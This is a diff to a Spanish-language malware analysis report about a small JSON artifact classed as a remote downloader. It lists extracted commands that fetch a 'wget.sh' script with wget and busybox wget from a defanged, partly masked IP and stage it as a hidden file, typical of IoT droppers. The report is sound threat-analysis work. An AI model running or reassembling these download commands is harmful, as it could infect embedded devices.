@@ -4,7 +4,12 @@
 
 ## 📌 Resumen
 
-Artefacto identificado como JSON text data de 214 B. La evidencia estática disponible identifica capacidad de descarga remota. La referencia remota apunta al recurso `wget.sh` en `hxxp://91.92.40.XXX/wget.sh`. Se observaron o extrajeron 1 comandos relacionados con el artefacto.
+Artefacto identificado como JSON text data de 214 B. La evidencia disponible identifica capacidad de descarga remota. Recurso remoto principal: `wget.sh` en `hxxp://91.92.40.XXX/wget.sh`. **Comandos observados o extraídos, en orden de aparición en la evidencia:**
+
+1. `chmod`
+2. `rm -f .s`
+3. `wget hxxp://91.92.40.XXX/wget.sh -O .s`
+4. `busybox wget hxxp://91.92.40.XXX` Los comandos se presentan como evidencia observada o extraída; no se afirma ejecución salvo que la relación registrada sea `executed`. **Perfil técnico:** `Linux / BusyBox`, compatible con sistemas embebidos o IoT. BusyBox se trata como indicio de plataforma y no como prueba suficiente de que el dispositivo sea IoT. **Ficha malware:** [malware-like/oraculo/downloader/d79a23b13fece5dd0c54c65b5437d2b8c88d1ffd0916ac2bd85f8bb6edb8de8d.md](../../../../../malware-like/oraculo/downloader/d79a23b13fece5dd0c54c65b5437d2b8c88d1ffd0916ac2bd85f8bb6edb8de8d.md)
 
 
 ## 🏷️ Clasificación
